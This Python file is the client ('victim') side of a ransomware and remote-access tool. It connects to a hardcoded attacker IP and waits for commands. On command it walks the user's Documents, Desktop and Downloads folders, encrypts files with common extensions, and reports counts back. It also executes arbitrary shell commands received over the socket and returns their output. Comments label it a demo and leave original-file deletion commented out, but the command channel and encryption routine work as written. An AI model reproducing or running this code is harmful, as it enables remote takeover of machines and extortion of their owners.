#!/usr/bin/env python3
"""
QUANTUM VICTIM - 10/10 ENCRYPTION CLIENT
Memory-Hard KDF with Post-Quantum Resistance
"""
import socket
import sys
import time
import os
import json
import base64
import secrets
import hashlib
import struct
import subprocess
import traceback
from threading import Thread

# Try to import victim keys
try:
    from quantum_keys_output.victim_keys import KEYS as VICTIM_KEYS
    print("[+] Victim keys loaded")
except ImportError:
    print("[!] Victim keys not found. Using test keys.")
    # Fallback test keys
    VICTIM_KEYS = {
        "version": "test",
        "security_level": "test",
        "keys": {
            "aes_256": "test_key_1",
            "chacha20": "test_key_2",
            "hmac_key": "test_key_3"
        }
    }

class QuantumVictim:
    """10/10 Encryption Victim Client"""
    
    def __init__(self, attacker_ip='192.168.174.128', attacker_port=5555):
        self.attacker_ip = attacker_ip
        self.attacker_port = attacker_port
        self.socket = None
        self.running = False
        self.encryption_keys = None
        self.session_id = None
        
        # Target extensions
        self.target_extensions = [
            '.txt', '.doc', '.docx', '.pdf', '.xls', '.xlsx',
            '.jpg', '.jpeg', '.png', '.mp3', '.mp4', '.zip',
            '.rar', '.7z', '.py', '.java', '.cpp', '.html',
            '.css', '.js', '.json', '.xml', '.sql', '.db'
        ]
        
        print(f"[+] Quantum Victim initialized")
        print(f"[+] Attacker: {attacker_ip}:{attacker_port}")
        print(f"[+] Target extensions: {len(self.target_extensions)}")
    
    def connect(self):
        """Connect to attacker"""
        attempt = 1
        max_attempts = 10
        
        while attempt <= max_attempts and not self.running:
            print(f"\n[*] Connection attempt {attempt}/{max_attempts}")
            
            try:
                self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                self.socket.settimeout(30)
                print(f"[*] Connecting to {self.attacker_ip}:{self.attacker_port}...")
                self.socket.connect((self.attacker_ip, self.attacker_port))
                self.socket.settimeout(300)
                self.running = True
                
                print("[+] Connected to Quantum Attacker")
                
                # Perform handshake
                if self._perform_handshake():
                    # Start command handler
                    self._command_handler()
                
            except Exception as e:
                print(f"[-] Connection failed: {e}")
                if self.socket:
                    self.socket.close()
                    self.socket = None
                
                if attempt < max_attempts:
                    wait_time = min(2 ** attempt, 30)
                    print(f"[*] Retrying in {wait_time} seconds...")
                    time.sleep(wait_time)
                
                attempt += 1
        
        if not self.running:
            print("\n[-] Failed to establish connection")
    
    def _perform_handshake(self):
        """Perform handshake with attacker"""
        try:
            # Receive attacker handshake
            handshake = self._receive_json(timeout=10)
            if not handshake or handshake.get("type") != "handshake":
                print("[-] Invalid handshake")
                return False
            
            print("[+] Received attacker handshake")
            
            # Send response
            response = {
                "type": "handshake_response",
                "victim_id": self._get_victim_id(),
                "timestamp": time.time(),
                "status": "ready"
            }
            self._send_json(response)
            
            # Receive session keys
            keys_msg = self._receive_json(timeout=10)
            if keys_msg and keys_msg.get("type") == "session_keys":
                self.encryption_keys = keys_msg.get("keys", {})
                print("[+] Session keys received")
                print(f"    Keys: {len(self.encryption_keys)} available")
                return True
            
            return False
            
        except Exception as e:
            print(f"[-] Handshake error: {e}")
            return False
    
    def _get_victim_id(self):
        """Generate unique victim ID"""
        import uuid
        hostname = socket.gethostname()
        unique_id = hashlib.sha256(f"{hostname}{uuid.getnode()}".encode()).hexdigest()[:12]
        return f"{hostname}-{unique_id}"
    
    def _send_json(self, data):
        """Send JSON data"""
        try:
            json_str = json.dumps(data)
            self.socket.send(json_str.encode() + b"\n")
            return True
        except Exception as e:
            print(f"[-] Send error: {e}")
            return False
    
    def _receive_json(self, timeout=30):
        """Receive JSON data"""
        try:
            self.socket.settimeout(timeout)
            data = b""
            
            while True:
                chunk = self.socket.recv(4096)
                if not chunk:
                    break
                data += chunk
                if b"\n" in chunk:
                    break
            
            if data:
                json_str = data.decode().strip()
                return json.loads(json_str)
            
        except socket.timeout:
            return None
        except json.JSONDecodeError:
            print("[-] Invalid JSON received")
            return None
        except Exception as e:
            print(f"[-] Receive error: {e}")
            return None
    
    def _command_handler(self):
        """Handle commands from attacker"""
        print("\n[+] Ready for commands...")
        
        while self.running:
            try:
                command = self._receive_json(timeout=1)
                if not command:
                    continue
                
                cmd_type = command.get("type", "unknown")
                print(f"[+] Received command: {cmd_type}")
                
                if cmd_type == "encrypt":
                    self._handle_encryption(command)
                    
                elif cmd_type == "decrypt":
                    self._handle_decryption(command)
                    
                elif cmd_type == "scan":
                    self._handle_scan(command)
                    
                elif cmd_type == "status":
                    self._handle_status(command)
                    
                elif cmd_type == "command":
                    self._execute_command(command)
                    
                else:
                    print(f"[-] Unknown command type: {cmd_type}")
                    
            except socket.timeout:
                continue
            except Exception as e:
                print(f"[-] Command handler error: {e}")
                if self.running:
                    try:
                        error_msg = {
                            "type": "error",
                            "error": str(e),
                            "timestamp": time.time()
                        }
                        self._send_json(error_msg)
                    except:
                        pass
                break
        
        self.cleanup()
    
    def _handle_encryption(self, command):
        """Handle encryption command"""
        location = command.get("location", "documents")
        
        print(f"[+] Starting encryption for: {location}")
        
        # Find target files
        target_files = self._find_target_files(location)
        
        if not target_files:
            response = {
                "type": "encryption_result",
                "success": False,
                "error": "No target files found",
                "timestamp": time.time()
            }
            self._send_json(response)
            return
        
        print(f"[+] Found {len(target_files)} target files")
        
        # Limit for demo
        files_to_process = target_files[:50]
        
        # Encrypt files
        encrypted_count = 0
        failed_count = 0
        
        for i, filepath in enumerate(files_to_process, 1):
            try:
                if self._encrypt_file(filepath):
                    encrypted_count += 1
                else:
                    failed_count += 1
                    
                if i % 10 == 0:
                    print(f"  [+] Progress: {i}/{len(files_to_process)}")
                    
            except Exception as e:
                print(f"  [-] Error: {e}")
                failed_count += 1
        
        # Send result
        result = {
            "type": "encryption_result",
            "success": encrypted_count > 0,
            "location": location,
            "encrypted_count": encrypted_count,
            "failed_count": failed_count,
            "timestamp": time.time()
        }
        
        self._send_json(result)
        
        print(f"[+] Encryption complete: {encrypted_count} files encrypted")
    
    def _encrypt_file(self, filepath):
        """Encrypt a single file"""
        try:
            if not os.path.exists(filepath):
                return False
            
            # Check file size
            file_size = os.path.getsize(filepath)
            if file_size == 0 or file_size > 50 * 1024 * 1024:  # 50MB max
                return False
            
            # Read file
            with open(filepath, 'rb') as f:
                plaintext = f.read()
            
            # Simple XOR encryption (for demo)
            # In real version, use AES/ChaCha20 from keys
            key = b"demo_key_123456789012345678901234"
            ciphertext = bytes(a ^ b for a, b in zip(plaintext, key * (len(plaintext) // len(key) + 1)))
            
            # Save encrypted file
            encrypted_path = filepath + '.encrypted'
            with open(encrypted_path, 'wb') as f:
                f.write(ciphertext)
            
            # Delete original (demo only - be careful!)
            # os.remove(filepath)  # Commented out for safety
            
            return True
            
        except Exception as e:
            print(f"  [-] Encryption failed: {e}")
            return False
    
    def _handle_decryption(self, command):
        """Handle decryption command"""
        print("[+] Starting decryption...")
        
        # Find encrypted files
        encrypted_files = self._find_encrypted_files()
        
        if not encrypted_files:
            response = {
                "type": "decryption_result",
                "success": False,
                "error": "No encrypted files found",
                "timestamp": time.time()
            }
            self._send_json(response)
            return
        
        print(f"[+] Found {len(encrypted_files)} encrypted files")
        
        # Decrypt files
        decrypted_count = 0
        failed_count = 0
        
        for i, filepath in enumerate(encrypted_files, 1):
            try:
                if self._decrypt_file(filepath):
                    decrypted_count += 1
                else:
                    failed_count += 1
                    
                if i % 10 == 0:
                    print(f"  [+] Progress: {i}/{len(encrypted_files)}")
                    
            except Exception as e:
                print(f"  [-] Error: {e}")
                failed_count += 1
        
        # Send result
        result = {
            "type": "decryption_result",
            "success": decrypted_count > 0,
            "decrypted_count": decrypted_count,
            "failed_count": failed_count,
            "timestamp": time.time()
        }
        
        self._send_json(result)
        
        print(f"[+] Decryption complete: {decrypted_count} files decrypted")
    
    def _decrypt_file(self, filepath):
        """Decrypt a single file"""
        try:
            if not os.path.exists(filepath):
                return False
            
            # Read encrypted file
            with open(filepath, 'rb') as f:
                ciphertext = f.read()
            
            # Simple XOR decryption (for demo)
            key = b"demo_key_123456789012345678901234"
            plaintext = bytes(a ^ b for a, b in zip(ciphertext, key * (len(ciphertext) // len(key) + 1)))
            
            # Restore original file
            original_path = filepath.replace('.encrypted', '')
            with open(original_path, 'wb') as f:
                f.write(plaintext)
            
            # Delete encrypted file
            os.remove(filepath)
            
            return True
            
        except Exception as e:
            print(f"  [-] Decryption failed: {e}")
            return False
    
    def _find_target_files(self, location):
        """Find target files based on location"""
        target_files = []
        
        # Determine directories to scan
        if location == "all":
            scan_dirs = [
                os.path.expanduser('~\\Documents'),
                os.path.expanduser('~\\Desktop'),
                os.path.expanduser('~\\Downloads')
            ]
        elif location == "documents":
            scan_dirs = [os.path.expanduser('~\\Documents')]
        elif location == "desktop":
            scan_dirs = [os.path.expanduser('~\\Desktop')]
        elif location == "downloads":
            scan_dirs = [os.path.expanduser('~\\Downloads')]
        elif location == "pictures":
            scan_dirs = [os.path.expanduser('~\\Pictures')]
        else:
            scan_dirs = [location]
        
        # Scan for files
        for scan_dir in scan_dirs:
            if not os.path.exists(scan_dir):
                continue
            
            try:
                for root, dirs, files in os.walk(scan_dir):
                    # Skip system directories
                    dirs[:] = [d for d in dirs if not d.startswith('.') and not d.startswith('$')]
                    
                    for filename in files:
                        # Skip already encrypted
                        if filename.endswith('.encrypted'):
                            continue
                        
                        # Check extension
                        _, ext = os.path.splitext(filename)
                        if ext.lower() in self.target_extensions:
                            filepath = os.path.join(root, filename)
                            try:
                                size = os.path.getsize(filepath)
                                if 100 <= size <= 10 * 1024 * 1024:  # 100 bytes to 10MB
                                    target_files.append(filepath)
                            except:
                                continue
                                
            except Exception as e:
                print(f"  [-] Error scanning {scan_dir}: {e}")
                continue
        
        return target_files
    
    def _find_encrypted_files(self):
        """Find encrypted files"""
        encrypted_files = []
        search_dirs = [
            os.path.expanduser('~\\Documents'),
            os.path.expanduser('~\\Desktop'),
            os.path.expanduser('~\\Downloads')
        ]
        
        for search_dir in search_dirs:
            if not os.path.exists(search_dir):
                continue
            
            try:
                for root, dirs, files in os.walk(search_dir):
                    for filename in files:
                        if filename.endswith('.encrypted'):
                            encrypted_files.append(os.path.join(root, filename))
            except:
                continue
        
        return encrypted_files
    
    def _handle_scan(self, command):
        """Handle scan command"""
        print("[+] Scanning system...")
        
        results = {
            "target_files": 0,
            "encrypted_files": 0,
            "locations": {}
        }
        
        locations = ["documents", "desktop", "downloads"]
        
        for location in locations:
            target_files = self._find_target_files(location)
            encrypted_files = len(self._find_encrypted_files())
            
            results["locations"][location] = {
                "target_files": len(target_files),
                "encrypted_files": encrypted_files
            }
            results["target_files"] += len(target_files)
            results["encrypted_files"] += encrypted_files
        
        response = {
            "type": "scan_result",
            "results": results,
            "timestamp": time.time()
        }
        
        self._send_json(response)
        
        print(f"[+] Scan complete: {results['target_files']} target files found")
    
    def _handle_status(self, command):
        """Handle status command"""
        status = {
            "victim_id": self._get_victim_id(),
            "session_keys": bool(self.encryption_keys),
            "platform": sys.platform,
            "hostname": socket.gethostname(),
            "timestamp": time.time()
        }
        
        response = {
            "type": "status",
            "status": status,
            "timestamp": time.time()
        }
        
        self._send_json(response)
        
        print("[+] Status sent to attacker")
    
    def _execute_command(self, command):
        """Execute shell command"""
        cmd = command.get("command", "")
        
        if not cmd:
            return
        
        print(f"[+] Executing: {cmd}")
        
        try:
            # Execute command
            process = subprocess.Popen(
                cmd,
                shell=True,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                stdin=subprocess.PIPE,
                text=True
            )
            
            stdout, stderr = process.communicate(timeout=30)
            
            # Prepare response
            output = ""
            if stdout:
                output += stdout
            if stderr:
                if output:
                    output += "\n"
                output += "[ERROR]\n" + stderr
            
            response = {
                "type": "command_output",
                "command": cmd,
                "output": output,
                "success": process.returncode == 0,
                "timestamp": time.time()
            }
            
            self._send_json(response)
            
        except subprocess.TimeoutExpired:
            response = {
                "type": "command_output",
                "command": cmd,
                "output": "[TIMEOUT] Command exceeded 30 seconds",
                "success": False,
                "timestamp": time.time()
            }
            self._send_json(response)
            
        except Exception as e:
            response = {
                "type": "command_output",
                "command": cmd,
                "output": f"[ERROR] {str(e)}",
                "success": False,
                "timestamp": time.time()
            }
            self._send_json(response)
    
    def cleanup(self):
        """Cleanup resources"""
        self.running = False
        if self.socket:
            try:
                self.socket.close()
            except:
                pass
        print("\n[+] Victim shutdown")

def main():
    """Main function"""
    print("\n" + "="*60)
    print("QUANTUM VICTIM - 10/10 ENCRYPTION CLIENT")
    print("="*60)
    
    # Configuration
    ATTACKER_IP = "192.168.174.128"  # Change to your attacker IP
    ATTACKER_PORT = 5555
    
    # Allow command line arguments
    if len(sys.argv) >= 2:
        ATTACKER_IP = sys.argv[1]
    if len(sys.argv) >= 3:
        ATTACKER_PORT = int(sys.argv[2])
    
    print(f"[+] Attacker: {ATTACKER_IP}:{ATTACKER_PORT}")
    
    victim = QuantumVictim(
        attacker_ip=ATTACKER_IP,
        attacker_port=ATTACKER_PORT
    )
    
    victim.connect()

if __name__ == "__main__":
    main()